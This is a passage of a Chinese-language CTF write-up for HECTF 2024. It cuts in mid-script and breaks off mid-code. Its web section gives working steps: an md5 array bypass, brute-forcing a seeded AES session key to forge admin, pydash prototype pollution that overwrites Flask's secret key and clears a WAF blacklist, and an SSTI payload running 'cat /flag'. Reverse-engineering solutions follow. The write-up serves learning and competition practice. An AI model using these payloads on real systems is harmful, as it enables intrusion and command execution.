class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># databases: flag1shere</span></span><br><span class="line"><span class="comment"># tables: flag_is_in_flag1shere_loockhere_flag,lookhere</span></span><br><span class="line"><span class="comment"># column: </span></span><br><span class="line"><span class="comment"># 【表flag_is_in_flag1shere_loockhere_flag】hint</span></span><br><span class="line"><span class="comment"># 【表lookhere】flag</span></span><br><span class="line"><span class="comment"># 内容：</span></span><br><span class="line"><span class="comment"># 【表flag_is_in_flag1shere_loockhere_flag】flag</span></span><br><span class="line"><span class="comment"># 【表lookhere】HECTF&#123;df1b330bbc2280e5021137e34461c224907f45c3&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><blockquote><p>Try to be admin to get flag！！！</p><p><strong>提示1</strong> Hint：xxxxx为c、e、f、h、t 这五个没大没小的字母</p></blockquote><p>查看源代码，有注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aWYoJF9HRVRbJ2EnXSAhPSAkX0dFVFsnYiddICYmIG1kNSgkX0dFVFsnYSddKSA9PSBtZDUoJF9HRVRbJ2InXSkpIHsKICAgIGlmICgkX0dFVFsnYyddICE9ICRfR0VUWydkJ10gJiYgbWQ1KCRfR0VUWydjJ10pID09PSBtZDUoJF9HRVRbJ2QnXSkpIHsKICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2d1ZXNzJ10pICYmIG1kNSgkX0dFVFsnZ3Vlc3MnXSkgPT09ICdhYTQ3NmNmNzE0M2ZlNjljMjliMzZlNGQwYTc5MzYwNCcpIHsgLy94eHh4eDIwMjQKICAgICAgICAgICAgaGlnaGxpZ2h0X2ZpbGUoInNlY3JldC5waHAiKTsKICAgICAgICB9CiAgICB9Cn0=</span><br></pre></td></tr></table></figure><p>base64解码得到部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class="comment">//xxxxx2024</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破md5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;HECTFhectf&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    suffix = <span class="string">&#x27;2024&#x27;</span></span><br><span class="line">    cipher = <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span></span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((x + suffix).encode()).hexdigest() == cipher, table, length=<span class="number">5</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(proof)</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line"><span class="comment"># hECTf</span></span><br></pre></td></tr></table></figure><p>GET传值：</p><p><code>?a[]=1&amp;b[]=2&amp;c[]=3&amp;d[]=4&amp;guess=hECTf2024</code></p><p>得到 <code>secret.php</code> 部分源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//mt_srand(rand(1e5,1e7));</span></span><br><span class="line"><span class="comment">//$key = rand();</span></span><br><span class="line"><span class="comment">//file_put_contents(*,$key);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写代码爆破key值，顺便替换guest为admin：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$iv</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$encrypted</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$iv</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_decryption</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;guest&quot;</span>) !== <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$session</span> = <span class="string">&quot;OTTg3UDhQn1AyNy60WpcZU/4iEdqTE/YtcSUUlQPPeqcQKVIhgZUO+wK7t9K64eFhcfieaPsjv9cBrq9LPMxnbvZ//egvZrQ72fXUKz/R0IEzgLXPFP/WDwyexB3KlIl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$min_seed</span> = <span class="number">100000</span>;</span><br><span class="line"><span class="variable">$max_seed</span> = <span class="number">10000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$seed</span> = <span class="variable">$min_seed</span>; <span class="variable">$seed</span> &lt; <span class="variable">$max_seed</span>; <span class="variable">$seed</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_valid_decryption</span>(<span class="variable">$decrypted</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key found! Seed: <span class="subst">$seed</span>, Key: <span class="subst">$key</span>\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Decrypted data: <span class="subst">$decrypted</span>\n&quot;</span>;</span><br><span class="line">        <span class="comment">// Decrypted data: O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;guest&quot;;&#125;</span></span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">session_encrypt</span>(<span class="variable">$msg</span>, <span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key found! Seed: 9020413, Key: 2041025242</span></span><br><span class="line"><span class="comment">// Decrypted data: O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;guest&quot;;&#125;</span></span><br><span class="line"><span class="comment">// OTTg3UDhQn1AyNy60WpcZU/4iEdqTE/YtcSUUlQPPeqcQKVIhgZUO+wK7t9K64eFzGqWoHSMfEjGvUzTGy6Kp46YHNCB/nFVAJWso8TWfcB92gsD4DWvVQvSpT5EBn/x</span></span><br></pre></td></tr></table></figure><p>替换token，刷新页面，成功伪造为admin，查看源代码得到flag：</p><p><code>Here is your flag:&lt;!--HECTF&#123;871d3db4c182eb6d994078bd6c41643a8cd49ace&#125;</code></p><p>​    </p><h3 id="你一个人专属的进货网站"><a href="#你一个人专属的进货网站" class="headerlink" title="你一个人专属的进货网站"></a>你一个人专属的进货网站</h3><blockquote><p>w41tm00n第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是w41tm00n没学过网安的知识，写的网站存在漏洞你作为w41tm00n的好朋友，同时你是位网安的实习生，w41tm00n就找到了你帮他测试网站是否存在漏洞。w41tm00n跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag文件）</p></blockquote><p><code>app.py</code> 中使用了pydash 5.1.2，且在路由 <code>/setUserInfo</code> 使用了 <code>set_(user,key,value)</code>，检索知存在原型链污染漏洞，参考：<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">Pydash 原型链污染</a>。</p><p>可在 <code>/setUserInfo</code> 路由内污染任意全局变量，首先修改secretkey：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /setUserInfo</span><br><span class="line">key=__class__.__init__.__globals__.app.secret_key&amp;value=123456&amp;Button=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p>将 <code>app.secret_key</code> 修改为 <code>123456</code>，即可伪造flask session：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;username&#39;: &#39;aa&#39;, &#39;password&#39;: &#39;bb&#39;, &#39;verify&#39;: &#39;admin&#39;&#125;&quot; --secret &#39;123456&#39; --no-literal-evaleyJwYXNzd29yZCI6ImJiIiwidXNlcm5hbWUiOiJhYSIsInZlcmlmeSI6ImFkbWluIn0.Z1VUWQ.Ae1Tf_dNm81tzQlmgzTrG3yKCjU</code></p><p>进到 <code>/admin</code>，发现用户名回显，可利用SSTI漏洞，但需绕过黑盒WAF。</p><p>结合 <code>/setUserInfo</code> 修改username，再访问 <code>/admin</code>，测试WAF的 <code>blasklist</code> 内容，发现同时过滤了两种花括号头，无法SSTI。</p><p>想到同样可利用原型链污染清空 <code>WAF.py</code> 里的 <code>blacklist</code> 值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /setUserInfo</span><br><span class="line">key=__class__.__init__.__globals__.WAF.blacklist&amp;value=1&amp;Button=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p>最后正常SSTI：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /setUserInfo</span><br><span class="line">key=username&amp;value=&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&amp;Button=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p>访问 <code>/admin</code> 得到flag。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><blockquote><p>g01den最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p></blockquote><p>IDA分析逻辑，在代码 <code>sub_1920(v9, v7);</code> 处，实现了变表base64加密，表为：</p><p><code>yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</code></p><p>在代码 <code>sub_17A7(v9);</code> 处，先异或 <code>i/3</code>，再比较字符串。</p><p>提取出密文，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">b&#x27;QCTCUBZvOFHs\\F&#125;kNPUhQU&#125;&gt;E]CgE&gt;;=GIS TYC`@_I~E8u8G|%)Z&#125;Yc_FW8_By(&#x27;</span></span><br><span class="line"><span class="comment"># 还原</span></span><br><span class="line">x = <span class="built_in">list</span>(c)</span><br><span class="line">y = <span class="built_in">bytes</span>([x[i]^(i//<span class="number">3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure><p>再Cyberchef解变表base64，得flag：<code>HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</code>。</p><p>​    </p><h3 id="littleasm"><a href="#littleasm" class="headerlink" title="littleasm"></a>littleasm</h3><blockquote><p>百行代码里的藏匿的flag</p></blockquote><p>给定汇编代码，利用GPT快速还原大概伪码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数据部分</span></span><br><span class="line"><span class="type">char</span> flag[<span class="number">28</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> key[<span class="number">3</span>] = &#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">28</span>] = &#123;<span class="number">0x6a</span>, <span class="number">0x28</span>, <span class="number">0x3d</span>, <span class="number">0x4e</span>, <span class="number">0x2b</span>, <span class="number">0x05</span>, <span class="number">0x63</span>, <span class="number">0x1e</span>, <span class="number">0x0d</span>, <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x1c</span>, <span class="number">0x73</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x73</span>, <span class="number">0x5e</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x5d</span>, <span class="number">0x21</span>, <span class="number">0x3f</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x6d</span>, <span class="number">0x4c</span>, <span class="number">0x3</span>&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *msg_wrong = <span class="string">&quot;WRONG!!!\n&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *msg_right = <span class="string">&quot;Right!!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 读取用户输入的 flag</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter flag: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%27s&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密过程</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 第一组</span></span><br><span class="line">        <span class="type">int</span> key_index = (i + <span class="number">2</span>) % <span class="number">3</span>;</span><br><span class="line">        data[i] = (flag[i] ^ key[key_index]) + <span class="number">0x2C</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二组</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; <span class="number">28</span>) &#123;</span><br><span class="line">            key_index = (i + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">            data[i + <span class="number">1</span>] = (flag[i + <span class="number">1</span>] ^ key[key_index]) + <span class="number">0x08</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三组</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">2</span> &lt; <span class="number">28</span>) &#123;</span><br><span class="line">            key_index = i % <span class="number">3</span>;</span><br><span class="line">            data[i + <span class="number">2</span>] = (flag[i + <span class="number">2</span>] ^ key[key_index]) ^ <span class="number">0x0C</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验加密结果</span></span><br><span class="line">    <span class="type">int</span> wrong = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[i] != data[i]) &#123;</span><br><span class="line">            wrong = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印结果</span></span><br><span class="line">    <span class="keyword">if</span> (wrong) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg_wrong);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg_right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据逻辑逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x6a</span>, <span class="number">0x28</span>, <span class="number">0x3d</span>, <span class="number">0x4e</span>, <span class="number">0x2b</span>, <span class="number">0x05</span>, <span class="number">0x63</span>, <span class="number">0x1e</span>, <span class="number">0x0d</span>, <span class="number">0x73</span>, <span class="number">0x10</span>, <span class="number">0x1c</span>, <span class="number">0x73</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x73</span>, <span class="number">0x5e</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x5d</span>, <span class="number">0x21</span>, <span class="number">0x3f</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x6d</span>, <span class="number">0x4c</span>, <span class="number">0x3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;rev&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = [-<span class="number">1</span>]*<span class="built_in">len</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">if</span> i+<span class="number">2</span>&lt;<span class="number">28</span>:</span><br><span class="line">        f[i+<span class="number">2</span>] = (c[i+<span class="number">2</span>]^<span class="number">0xc</span>)^k[i%<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> i+<span class="number">1</span>&lt;<span class="number">28</span>:</span><br><span class="line">        f[i+<span class="number">1</span>] = (c[i+<span class="number">1</span>]-<span class="number">0x8</span>)^k[(i+<span class="number">1</span>)%<span class="number">3</span>]</span><br><span class="line">    f[i] = (c[i]-<span class="number">0x2c</span>)^k[(i+<span class="number">2</span>)%<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">f = [k&amp;<span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> f]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Ass1mb1y_13_s0_eas7!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PE-py"><a href="#PE-py" class="headerlink" title="PE?py?"></a>PE?py?</h3><blockquote><p>在pyre里找到压缩包密码</p></blockquote><p>16进制查看 <code>pyre.exe</code>，修复：1. 开头 <code>MM</code> 改 <code>MZ</code>，2. DosHeader里的 LONG AddressOfNewExeHeader 改为 0x108h。</p><p>pyinstxtractor解包，反编译 <code>pyre.pyc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;PE?py?\n&#x27;</span>)</span><br><span class="line">data = <span class="string">&#x27;the_key_is_:&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;Have_a_cup_of_tea_together&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Can you uncover the secrets of this file?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用 <code>Have_a_cup_of_tea_together</code> 为密码解压 <code>do_you_like_tea.zip</code>，得到 <code>main1.exe</code>。</p><p>IDA分析，是一个标准xtea，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 